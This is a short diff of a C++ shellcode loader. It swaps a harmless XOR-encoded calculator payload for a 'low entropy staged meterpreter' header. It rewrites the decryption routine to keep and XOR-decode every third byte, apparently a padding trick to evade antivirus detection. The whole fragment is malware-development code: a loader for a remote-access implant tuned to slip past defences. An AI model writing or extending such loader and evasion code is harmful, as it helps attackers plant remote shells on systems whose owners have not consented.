@@ -7,18 +7,23 @@
 #ifdef SHELLCODE_PATH
 #include SHELLCODE_PATH
 #else
-#include "../../src/shellcodes/xored_calc.hpp"
+#include "../../src/shellcodes/xored_low_entropy_staged_meterpreter.hpp"
 #endif
 
 
 // This function will xor the payload with the key in order to decrypt it
 void decrypt_payload(unsigned char* payload, unsigned int payload_size, const unsigned char xor_key)
 {
+    int j = 0;
 	for (unsigned int i = 0; i < payload_size-1; i+=3)
 	{
-		payload[i] ^= xor_key;
-        std::cout <<  std::hex <<int(payload[i]);
+        payload[j] = payload[i] ^ xor_key;
+        //std::cout <<  std::hex <<int(payload[i]);
+        j++;
 	}
+    for (unsigned int i = 0; i < (payload_size-1)/3; i+=1){
+        std::cout <<  std::hex <<int(payload[i]);
+    }
 }
 
 int main()
